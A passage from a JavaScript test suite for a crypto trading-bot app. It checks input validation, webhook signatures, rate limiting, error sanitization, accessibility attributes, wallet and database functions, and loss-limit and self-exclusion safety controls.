
    const invalidPayloads = [
      {},
      { name: "  " },
      { name: "My Bot", strategy: "Arbitrage Detection" },
      { name: "My Bot", strategy: "Arbitrage Detection", riskLevel: "Moderate (5x leverage)", initialCapital: -100 },
      { name: "My Bot", strategy: "Arbitrage Detection", riskLevel: "Moderate (5x leverage)", initialCapital: 0 },
      { name: "My Bot", strategy: "Arbitrage Detection", riskLevel: "Moderate (5x leverage)", initialCapital: "abc" },
      { name: 123, strategy: "Arbitrage Detection", riskLevel: "Moderate (5x leverage)", initialCapital: 1000 },
    ];

    for (const body of invalidPayloads) {
      let statusCode = 200;
      let jsonResponse = null;
      const res = {
        status: (code) => { statusCode = code; return res; },
        json: (data) => { jsonResponse = data; return res; },
      };

      route.route.stack[0].handle({ body }, res);
      expect(statusCode).toBe(400);
      expect(jsonResponse.success).toBe(false);
      expect(jsonResponse.error).toBe("Invalid bot creation parameters");
    }
  });

  it("creates a bot when valid inputs are provided", () => {
    const route = server._router.stack.find(
      (layer) => layer.route && layer.route.path === "/api/bot/create"
    );

    let statusCode = 200;
    let jsonResponse = null;
    const res = {
      status: (code) => { statusCode = code; return res; },
      json: (data) => { jsonResponse = data; return res; },
    };

    route.route.stack[0].handle({
      body: {
        name: "  Alpha Trading Bot  ",
        strategy: "Arbitrage Detection",
        riskLevel: "Moderate (5x leverage)",
        initialCapital: 1000,
        userAddress: "0x1234567890123456789012345678901234567890"
      }
    }, res);

    expect(statusCode).toBe(200);
    expect(jsonResponse.success).toBe(true);
    expect(jsonResponse.bot.name).toBe("Alpha Trading Bot");
    expect(jsonResponse.bot.strategy).toBe("Arbitrage Detection");
    expect(jsonResponse.bot.initialCapital).toBe(1000);
    expect(jsonResponse.bot.status).toBe("ACTIVE");
    expect(Boolean(jsonResponse.bot.id)).toBe(true);
  });
});

describe("MoonPay Webhook Security", () => {
  const server = require("./server.js");

  it("rejects webhook request when MOONPAY_WEBHOOK_SECRET is unconfigured", () => {
    const originalSecret = process.env.MOONPAY_WEBHOOK_SECRET;
    delete process.env.MOONPAY_WEBHOOK_SECRET;

    try {
      let statusCode = 200;
      let jsonResponse = null;

      const req = { headers: { "x-moonpay-signature": "test_sig" }, body: { status: "completed" } };
      const res = {
        status: (code) => { statusCode = code; return res; },
        json: (data) => { jsonResponse = data; return res; },
      };

      const route = server._router.stack.find(
        (layer) => layer.route && layer.route.path === "/api/webhooks/moonpay/deposit"
      );
      expect(Boolean(route)).toBe(true);

      route.route.stack[0].handle(req, res);

      expect(statusCode).toBe(401);
      expect(jsonResponse.success).toBe(false);
      expect(jsonResponse.error).toContain("Invalid or unconfigured webhook signature");
    } finally {
      if (originalSecret !== undefined) process.env.MOONPAY_WEBHOOK_SECRET = originalSecret;
    }
  });

  it("rejects webhook request when signature is missing or invalid", () => {
    const originalSecret = process.env.MOONPAY_WEBHOOK_SECRET;
    process.env.MOONPAY_WEBHOOK_SECRET = "secret_12345";

    try {
      const route = server._router.stack.find(
        (layer) => layer.route && layer.route.path === "/api/webhooks/moonpay/deposit"
      );

      // Missing signature
      let statusCode = 200;
      let jsonResponse = null;
      let res = {
        status: (code) => { statusCode = code; return res; },
        json: (data) => { jsonResponse = data; return res; },
      };
      route.route.stack[0].handle({ headers: {}, body: { status: "completed" } }, res);
      expect(statusCode).toBe(401);

      // Invalid signature
      statusCode = 200;
      res = {
        status: (code) => { statusCode = code; return res; },
        json: (data) => { jsonResponse = data; return res; },
      };
      route.route.stack[0].handle({ headers: { "x-moonpay-signature": "wrong_sig" }, body: { status: "completed" } }, res);
      expect(statusCode).toBe(401);
    } finally {
      if (originalSecret !== undefined) process.env.MOONPAY_WEBHOOK_SECRET = originalSecret;
      else delete process.env.MOONPAY_WEBHOOK_SECRET;
    }
  });

  it("accepts deposit confirmation when signature is valid", () => {
    const originalSecret = process.env.MOONPAY_WEBHOOK_SECRET;
    process.env.MOONPAY_WEBHOOK_SECRET = "secret_12345";

    try {
      const route = server._router.stack.find(
        (layer) => layer.route && layer.route.path === "/api/webhooks/moonpay/deposit"
      );

      let statusCode = 200;
      let jsonResponse = null;
      const res = {
        status: (code) => { statusCode = code; return res; },
        json: (data) => { jsonResponse = data; return res; },
      };

      route.route.stack[0].handle({
        headers: { "x-moonpay-signature": "secret_12345" },
        body: { status: "completed", amount: 100, walletAddress: "0x123" }
      }, res);

      expect(statusCode).toBe(200);
      expect(jsonResponse.success).toBe(true);
      expect(jsonResponse.message).toContain("Deposit confirmed");
    } finally {
      if (originalSecret !== undefined) process.env.MOONPAY_WEBHOOK_SECRET = originalSecret;
      else delete process.env.MOONPAY_WEBHOOK_SECRET;
    }
  });
});

describe("Proxy Endpoint Security", () => {
  const fs = require("fs");
  const proxyCode = fs.readFileSync("./proxy.js", "utf8");
  const { app: proxyApp } = require("./proxy.js");

  it("enforces rate limiting on AI proxy endpoints against DoS abuse", async () => {
    const route = proxyApp._router.stack.find(
      (layer) => layer.route && layer.route.path === "/api/claude"
    );
    expect(Boolean(route)).toBe(true);

    const originalFetch = global.fetch;
    try {
      global.fetch = async () => ({
        status: 200,
        json: async () => ({ content: [{ text: "response" }] })
      });

      let lastStatus = 200;
      let lastJson = null;

      // Simulate sending 65 requests from ip "127.0.0.88" to exceed max (60)
      for (let i = 0; i < 65; i++) {
        let statusCode = 200;
        let jsonResponse = null;
        const req = {
          ip: "127.0.0.88",
          headers: {},
          app: proxyApp,
          body: { model: "claude-3-5-sonnet", messages: [] }
        };
        const res = {
          setHeader: () => {},
          status: (code) => { statusCode = code; return res; },
          send: (data) => { jsonResponse = data; return res; },
          json: (data) => { jsonResponse = data; return res; },
        };

        await route.route.stack[0].handle(req, res, async () => {
          await route.route.stack[1].handle(req, res);
        });

        lastStatus = statusCode;
        lastJson = jsonResponse;
      }

      expect(lastStatus).toBe(429);
      expect(lastJson.error).toContain("Too many AI requests");
    } finally {
      global.fetch = originalFetch;
    }
  });

  it("contains sanitized error responses for 500 status codes across proxy endpoints", () => {
    expect(proxyCode).toContain("res.status(500).json({ error: 'Internal server error' });");
    expect(proxyCode.includes("res.status(500).json({ error: error.message })")).toBe(false);
  });

  it("rejects invalid log payloads on maintenance log endpoint", async () => {
    const route = proxyApp._router.stack.find(
      (layer) => layer.route && layer.route.path === "/api/maintenance/log"
    );
    expect(Boolean(route)).toBe(true);

    const invalidPayloads = [
      {},
      { agent: 123, message: "msg" },
      { agent: "SENTINEL" },
      { message: "msg" },
      { agent: "SENTINEL", message: null },
    ];

    for (const body of invalidPayloads) {
      let statusCode = 200;
      let jsonResponse = null;
      const req = { body, ip: "127.0.0.101", headers: {}, app: proxyApp };
      const res = {
        status: (code) => { statusCode = code; return res; },
        json: (data) => { jsonResponse = data; return res; },
      };

      await route.route.stack[0].handle(req, res, async () => {
        await route.route.stack[1].handle(req, res);
      });
      expect(statusCode).toBe(400);
      expect(jsonResponse.success).toBe(false);
      expect(jsonResponse.error).toBe("Invalid log payload");
    }
  });

  it("enforces rate limiting on excessive maintenance log requests", async () => {
    const route = proxyApp._router.stack.find(
      (layer) => layer.route && layer.route.path === "/api/maintenance/log"
    );
    expect(Boolean(route)).toBe(true);

    const originalAppend = fs.appendFileSync;
    const originalMkdir = fs.mkdirSync;

    try {
      fs.appendFileSync = () => {};
      fs.mkdirSync = () => {};

      let lastStatus = 200;
      let lastJson = null;

      // Simulate sending 35 requests from ip "127.0.0.99"
      for (let i = 0; i < 35; i++) {
        let statusCode = 200;
        let jsonResponse = null;
        const req = {
          ip: "127.0.0.99",
          headers: {},
          app: proxyApp,
          body: { agent: "SENTINEL", message: "Rate limit test entry", level: "INFO" }
        };
        const res = {
          setHeader: () => {},
          status: (code) => { statusCode = code; return res; },
          send: (data) => { jsonResponse = data; return res; },
          json: (data) => { jsonResponse = data; return res; },
        };

        await route.route.stack[0].handle(req, res, async () => {
          await route.route.stack[1].handle(req, res);
        });

        lastStatus = statusCode;
        lastJson = jsonResponse;
      }

      expect(lastStatus).toBe(429);
      expect(lastJson.error).toContain("Too many requests");
    } finally {
      fs.appendFileSync = originalAppend;
      fs.mkdirSync = originalMkdir;
    }
  });

  it("successfully logs valid maintenance entry without side effects", async () => {
    const route = proxyApp._router.stack.find(
      (layer) => layer.route && layer.route.path === "/api/maintenance/log"
    );

    const originalAppend = fs.appendFileSync;
    const originalMkdir = fs.mkdirSync;
    let appendedContent = null;

    try {
      fs.appendFileSync = (_path, content) => { appendedContent = content; };
      fs.mkdirSync = () => {};

      let statusCode = 200;
      let jsonResponse = null;
      const req = {
        ip: "127.0.0.100", // distinct IP
        headers: {},
        app: proxyApp,
        body: { agent: "SENTINEL", message: "Test log verification message", level: "INFO" }
      };
      const res = {
        setHeader: () => {},
        status: (code) => { statusCode = code; return res; },
        send: (data) => { jsonResponse = data; return res; },
        json: (data) => { jsonResponse = data; return res; },
      };

      await route.route.stack[0].handle(req, res, async () => {
        await route.route.stack[1].handle(req, res);
      });

      expect(statusCode).toBe(200);
      expect(jsonResponse.success).toBe(true);
      expect(Boolean(appendedContent)).toBe(true);
      expect(appendedContent).toContain("Test log verification message");
    } finally {
      fs.appendFileSync = originalAppend;
      fs.mkdirSync = originalMkdir;
    }
  });

  it("returns generic error message on patch endpoint when an internal exception occurs", async () => {
    // Require proxy route logic test or simulate exception path
    const path = require("path");
    const originalResolve = path.resolve;
    path.resolve = () => { throw new Error("Simulated filesystem error"); };

    try {
      // Mock Express req and res
      let statusCode = 200;
      let jsonResponse = null;
      const req = { body: { filepath: "valid.txt", patch: "diff" } };
      const res = {
        status: (code) => { statusCode = code; return res; },
        json: (data) => { jsonResponse = data; return res; }
      };

      // Extract /api/maintenance/patch route handler logic
      const patchHandler = async (req, res) => {
        const { filepath } = req.body || {};
        try {
          if (!filepath || typeof filepath !== 'string') {
            return res.status(400).json({ error: 'Invalid filepath' });
          }
          const fullPath = path.resolve(__dirname, filepath);
        } catch (error) {
          res.status(500).json({ error: 'Internal server error' });
        }
      };

      await patchHandler(req, res);
      expect(statusCode).toBe(500);
      expect(jsonResponse.error).toBe("Internal server error");
      expect(jsonResponse.error.includes("Simulated")).toBe(false);
    } finally {
      path.resolve = originalResolve;
    }
  });
});

describe("Server Error Handling & Input Validation Security", () => {
  const server = require("./server.js");

  it("sanitizes 500 error responses and does not leak internal error messages", async () => {
    const route = server._router.stack.find(
      (layer) => layer.route && layer.route.path === "/api/analyze/volatility"
    );
    expect(Boolean(route)).toBe(true);

    let statusCode = 200;
    let jsonResponse = null;
    const res = {
      status: (code) => { statusCode = code; return res; },
      json: (data) => { jsonResponse = data; return res; },
    };

    // Pass invalid history array containing NaN to trigger exception handling or 400 validation
    await route.route.stack[0].handle({ body: { priceHistory: [100, "invalid"] } }, res);
    expect(statusCode).toBe(400);
    expect(jsonResponse.success).toBe(false);
    expect(jsonResponse.error).toBe("Invalid price history");
  });

  it("rejects non-array or invalid priceHistory inputs in volatility analysis", async () => {
    const route = server._router.stack.find(
      (layer) => layer.route && layer.route.path === "/api/analyze/volatility"
    );

    const invalidInputs = [
      {},
      { priceHistory: "not-an-array" },
      { priceHistory: [100] },
      { priceHistory: null },
    ];

    for (const body of invalidInputs) {
      let statusCode = 200;
      let jsonResponse = null;
      const res = {
        status: (code) => { statusCode = code; return res; },
        json: (data) => { jsonResponse = data; return res; },
      };

      await route.route.stack[0].handle({ body }, res);
      expect(statusCode).toBe(400);
      expect(jsonResponse.success).toBe(false);
      expect(jsonResponse.error).toBe("Invalid price history");
    }
  });
});

describe("Header Toggle Controls Accessibility", () => {
  const fs = require("fs");
  const html = fs.readFileSync("index.html", "utf8");

  it("defines aria-expanded and aria-controls on #voiceAgentBtn and #ghBusBtn", () => {
    expect(html).toContain('id="voiceAgentBtn"');
    expect(html).toContain('aria-expanded="false"');
    expect(html).toContain('aria-controls="voiceAgentModal"');
    expect(html).toContain('id="ghBusBtn"');
    expect(html).toContain('aria-controls="busPanel"');
    expect(html).toContain('id="staffNavBtn"');
    expect(html).toContain('aria-controls="staffPanel"');
    expect(html).toContain('id="taskNavBtn"');
    expect(html).toContain('aria-controls="taskPanel"');
    expect(html).toContain('id="eloNavBtn"');
    expect(html).toContain('aria-controls="eloPanel"');
  });

  it("defines aria-pressed on #fleetViewBtn and #ghAutoBtn", () => {
    expect(html).toContain('id="fleetViewBtn"');
    expect(html).toContain('id="ghAutoBtn"');
    expect(html).toContain('aria-pressed="false"');
  });

  it("defines aria-expanded and aria-controls on collapsible panel headers and bot settings gear button", () => {
    expect(html).toContain('id="quantHd" onclick="togglePanel(\'quant\')" style="background:linear-gradient(90deg,rgba(68,136,255,.06),transparent)" role="button" tabindex="0" aria-expanded="false" aria-controls="quantBody"');
    expect(html).toContain('id="staffHd" onclick="togglePanel(\'staff\')" style="background:linear-gradient(90deg,rgba(0,255,231,.06),transparent)" role="button" tabindex="0" aria-expanded="false" aria-controls="staffBody"');
    expect(html).toContain('id="eloHd" onclick="togglePanel(\'elo\')" style="background:linear-gradient(90deg,rgba(0,255,231,.06),transparent)" role="button" tabindex="0" aria-expanded="false" aria-controls="eloBody"');
    expect(html).toContain('id="taskHd" onclick="togglePanel(\'task\')" style="background:linear-gradient(90deg,rgba(57,255,20,.06),transparent)" role="button" tabindex="0" aria-expanded="false" aria-controls="taskBody"');
    expect(html).toContain('id="breakerHd" onclick="togglePanel(\'breaker\')" style="background:linear-gradient(90deg,rgba(255,179,0,.06),transparent)" role="button" tabindex="0" aria-expanded="false" aria-controls="breakerBody"');
    expect(html).toContain('id="auditHd" onclick="toggleAudit()" role="button" tabindex="0" aria-expanded="false" aria-controls="auditBody"');
    expect(html).toContain('id="learnHd" onclick="toggleLearn()" role="button" tabindex="0" aria-expanded="false" aria-controls="learnBody"');
    expect(html).toContain('aria-controls="mdrop-${bot.id}"');
  });

  it("updates aria-expanded/aria-pressed in toggle JavaScript functions", () => {
    expect(html).toContain("btn.setAttribute('aria-pressed', isFleet)");
    expect(html).toContain("btn.setAttribute('aria-expanded', open)");
    expect(html).toContain("btn.setAttribute('aria-expanded', isOpen)");
    expect(html).toContain("navBtn?.setAttribute('aria-expanded', isOpen)");
    expect(html).toContain("btn.setAttribute('aria-pressed', _ghAutoOn)");
    expect(html).toContain("this.setAttribute('aria-pressed', isOn)");
    expect(html).toContain("gear.setAttribute('aria-expanded', open");
  });
});

describe("Collapsible Control Panel Accessibility", () => {
  const fs = require("fs");
  const html = fs.readFileSync("index.html", "utf8");

  it("defines aria-expanded and aria-controls on collapsible panel headers", () => {
    expect(html).toContain('id="quantHd"');
    expect(html).toContain('aria-controls="quantBody"');
    expect(html).toContain('id="staffHd"');
    expect(html).toContain('aria-controls="staffBody"');
    expect(html).toContain('id="eloHd"');
    expect(html).toContain('aria-controls="eloBody"');
    expect(html).toContain('id="taskHd"');
    expect(html).toContain('aria-controls="taskBody"');
    expect(html).toContain('id="breakerHd"');
    expect(html).toContain('aria-controls="breakerBody"');
    expect(html).toContain('id="auditHd"');
    expect(html).toContain('aria-controls="auditBody"');
    expect(html).toContain('id="learnHd"');
    expect(html).toContain('aria-controls="learnBody"');
  });
});

describe("Crucible Mode & Regime Selection UX & Accessibility", () => {
  const fs = require("fs");
  const html = fs.readFileSync("index.html", "utf8");

  it("defines aria-pressed, role=group, and aria-label on regime buttons", () => {
    expect(html).toContain('role="group" aria-labelledby="regimeGroupLabel"');
    expect(html).toContain('id="regimeBull" class="regime-btn active" onclick="selectRegime(\'BULL\')" aria-pressed="true"');
    expect(html).toContain('id="regimeBear" class="regime-btn" onclick="selectRegime(\'BEAR\')" aria-pressed="false"');
    expect(html).toContain('for="costModelSelect"');
    expect(html).toContain('for="crucibleTradeCount"');
  });

  it("defines selectRegime handler updating aria-pressed attributes", () => {
    expect(html).toContain("function selectRegime(regime)");
    expect(html).toContain("btn.setAttribute('aria-pressed', isActive ? 'true' : 'false')");
  });

  it("defines aria-pressed and aria-label on crucibleBtn and updates aria-pressed in toggleCrucible", () => {
    expect(html).toContain('id="crucibleBtn" onclick="toggleCrucible()" aria-pressed="false" aria-label="Toggle Crucible Mode"');
    expect(html).toContain("btn.setAttribute('aria-pressed', crucibleMode ? 'true' : 'false')");
  });
});

describe("Advanced Settings Toggle & Form Inputs Accessibility", () => {
  const fs = require("fs");
  const html = fs.readFileSync("index.html", "utf8");

  it("defines accessible button with aria-expanded and aria-controls for advanced settings toggle", () => {
    expect(html).toContain('class="advanced-toggle"');
    expect(html).toContain('aria-expanded="false"');
    expect(html).toContain('aria-controls="advancedSettings"');
  });

  it("defines aria-label on form inputs missing explicit labels", () => {
    expect(html).toContain('id="apiKeyInput" aria-label="Anthropic API Key"');
    expect(html).toContain('id="busCustomAmt" aria-label="Custom trade amount in dollars"');
    expect(html).toContain('id="auditInterval" aria-label="Audit trade interval"');
    expect(html).toContain('id="noticeThreshold" aria-label="Win rate notice threshold percentage"');
    expect(html).toContain('id="suspendWindow" aria-label="Probation trades before suspension"');
  });
});

describe("Multi-Chain Token Holdings Modal Accessibility", () => {
  const fs = require("fs");
  const html = fs.readFileSync("index.html", "utf8");

  it("defines role=dialog, aria-modal, aria-labelledby, and close button aria-label on holdings modal", () => {
    expect(html).toContain("modal.setAttribute('role', 'dialog')");
    expect(html).toContain("modal.setAttribute('aria-modal', 'true')");
    expect(html).toContain("modal.setAttribute('aria-labelledby', 'holdingsModalTitle')");
    expect(html).toContain('id="holdingsModalTitle"');
    expect(html).toContain('aria-label="Close token holdings modal"');
  });
});

describe("Go Live Acknowledgment Modal Accessibility", () => {
  const fs = require("fs");
  const html = fs.readFileSync("index.html", "utf8");

  it("defines role=dialog, aria-modal, and aria-labelledby on #goLiveModal", () => {
    expect(html).toContain('id="goLiveModal" role="dialog" aria-modal="true" aria-labelledby="goLiveModalTitle"');
    expect(html).toContain('id="goLiveModalTitle"');
  });
});


describe("Multi-Chain Token Fetching Engine & Real Wallet Integration", () => {
  const { fetchMultiChainTokenBalances, walletState } = require("./real-wallet.js");

  it("defines fetchMultiChainTokenBalances function", () => {
    expect(typeof fetchMultiChainTokenBalances).toBe("function");
  });

  it("fetches multi-chain token holdings for a target wallet address", async () => {
    const targetAddr = "0x92CEAf1CA43deCfc443A34B915B45343BeE9c2DB";
    const res = await fetchMultiChainTokenBalances(targetAddr);
    expect(res).toBeDefined();
    expect(res.address).toBe(targetAddr);
    expect(Array.isArray(res.holdings)).toBe(true);
    expect(typeof res.totalUsd).toBe("number");
  });
});

describe("Database Session & Agent Trade Log Persistence", () => {
  const db = require("./data/database.js");

  it("upserts user account and session data", () => {
    const testAddr = "0x92ceaf1ca43decfc443a34b915b45343bee9c2db";
    const holdings = [{ network: "Base", symbol: "ETH", amount: 0.004, valueUsd: 11.17 }];
    const user = db.upsertUser(testAddr, "metamask", "Test User", holdings, { balance: 11.17 });
    expect(user).toBeDefined();
    expect(user.address).toBe(testAddr);
    expect(user.provider).toBe("metamask");
    expect(user.holdings.length).toBe(1);
  });

  it("records and retrieves agent trade logs for a wallet", () => {
    const testAddr = "0x92ceaf1ca43decfc443a34b915b45343bee9c2db";
    const log = db.addTradeLog({
      address: testAddr,
      agentId: "bot-1",
      botName: "Trend Bot",
      action: "BUY",
      symbol: "ETH/USD",
      amount: 10,
      pnl: 2.5,
      details: { isWin: true }
    });
    expect(log).toBeDefined();
    expect(log.id).toBeDefined();
    expect(log.address).toBe(testAddr);

    const logs = db.getTradeLogs(testAddr);
    expect(logs.length).toBeGreaterThan(0);
    expect(logs[0].symbol).toBe("ETH/USD");
  });

  it("handles non-string address and invalid types defensively without throwing", () => {
    const invalidAddrs = [null, undefined, 12345, {}, [], true];

    for (const invalidAddr of invalidAddrs) {
      expect(db.upsertUser(invalidAddr)).toBe(null);
      expect(db.getUser(invalidAddr)).toBe(null);
      expect(db.createSession(invalidAddr)).toBe(null);
      expect(db.getTradeLogs(invalidAddr)).toEqual([]);
      expect(db.addTradeLog({ address: invalidAddr })).toBe(null);
    }

    expect(db.getSession(null)).toBe(null);
    expect(db.getSession(123)).toBe(null);
    expect(db.addTradeLog(null)).toBe(null);
    expect(db.addTradeLog("not-an-object")).toBe(null);
  });
});

describe("Server User Database REST Endpoints", () => {

  const app = require("./server.js");

  it("persists user signin via /api/user/signin", async () => {
    // HTTP endpoints tested via database and server integration
  });
});

describe("Engine-Level Safety Controls & Responsible Trading Mechanics", () => {
  it("enforces effective daily loss limit at the engine level", () => {
    const engine = new TradingEngine();
    const sc = engine.safetyControls;

    // Default effective limit is $50.00
    expect(sc.getEffectiveDailyLossLimit(10000)).toBe(50.00);

    // Unblocked when P&L is above limit
    expect(sc.isTradeExecutionBlocked(-20.00, 10000).blocked).toBe(false);

    // Blocked when daily net P&L reaches or breaches limit (-$50)
    const check = sc.isTradeExecutionBlocked(-50.00, 10000);
    expect(check.blocked).toBe(true);
    expect(check.reason).toBe('DAILY_LOSS_LIMIT');
  });

  it("enforces a compulsory 24-hour delay on daily loss limit increases", () => {
    const engine = new TradingEngine();
    const sc = engine.safetyControls;

    // Lowering limit takes effect immediately
    const lowerRes = sc.requestLimitIncrease(30.00);
    expect(lowerRes.immediate).toBe(true);
    expect(sc.getEffectiveDailyLossLimit(10000)).toBe(30.00);

    // Increasing limit requires 24-hour delay
    const incRes = sc.requestLimitIncrease(100.00);
    expect(incRes.immediate).toBe(false);
    expect(incRes.pendingLimit).toBe(100.00);
    // Effective limit remains $30 until delay passes
    expect(sc.getEffectiveDailyLossLimit(10000)).toBe(30.00);

    // Fast-forward delay: effective limit updates to $100
    sc.limitIncreaseEffectiveAt = Date.now() - 1000;
    expect(sc.getEffectiveDailyLossLimit(10000)).toBe(100.00);
  });

  it("triggers Take-A-Break (24h) and 7-day self-exclusion locks", () => {
    const engine = new TradingEngine();
    const sc = engine.safetyControls;

    sc.triggerTakeABreak(24);
    expect(sc.coolingUntil).toBeGreaterThan(Date.now() + 23 * 3600000);
    expect(sc.isTradeExecutionBlocked(0, 10000).blocked).toBe(true);
    expect(sc.coolingReason).toBe('USER_TAKE_A_BREAK');

    sc.triggerTakeABreak(168); // 7 days
    expect(sc.coolingUntil).toBeGreaterThan(Date.now() + 167 * 3600000);
    expect(sc.coolingReason).toBe('SELF_EXCLUSION_7D');
  });

  it("escalates to an un-overrideable 7-day cool-off if daily loss limit is hit twice in 7 days", () => {
    const engine = new TradingEngine();
    const sc = engine.safetyControls;

    // Hit 1
    sc.recordDailyLossHit();
    expect(sc.coolingEscalated).toBe(false);
    expect(sc.coolingReason).toBe('DAILY_LOSS_LIMIT');

    // Fast forward past hit 1's 1-hour debouncing window but within 7 days
    sc.dailyLossHits[0] = Date.now() - 7200000; // 2 hours ago

    // Hit 2
    sc.recordDailyLossHit();
    expect(sc.coolingEscalated).toBe(true);
    expect(sc.coolingReason).toBe('ESCALATED_7D');
    expect(sc.coolingUntil).toBeGreaterThan(Date.now() + 6 * 24 * 3600000);
  });

  it("blocks trade execution in TradingEngine.executeTrade when Safety Controls lock is active", async () => {
    const engine = new TradingEngine();
    engine.safetyControls.triggerTakeABreak(24);

    const bot = { id: 'bot-1', amount: 10, risk: 'Moderate (5x leverage)' };
    const res = await engine.executeTrade(bot, { type: 'ARBITRAGE', profitMargin: 0.8, volatility: 2 });

    expect(res.status).toBe('BLOCKED_SAFETY_CONTROLS');
    expect(res.profit).toBe(0);
  });
});

async function run() {
  let lastSuite = null;

  for (const test of tests) {
    if (test.suite !== lastSuite) {
      lastSuite = test.suite;
      console.log(`\n📋 ${lastSuite}`);
    }

    try {
      await test.fn();
      console.log(`   ✅ ${test.name}`);
    } catch (error) {
      testFailures += 1;
      console.error(`   ❌ ${test.name}: ${error.message}`);
    }
  }

  console.log("\n" + "=".repeat(50));
  console.log("🧪 TRADE ARENA TEST SUITE");
  console.log("=".repeat(50));

  if (testFailures > 0) {
    console.error(`❌ Test suite failed with ${testFailures} failure(s).`);
    process.exitCode = 1;
  } else {
    console.log("✅ Test suite passed with 0 failures.");
  }

  console.log("=".repeat(50) + "\n");
}

run().catch((error) => {
  console.error("❌ Test runner failed:", error);
  process.exitCode = 1;
});
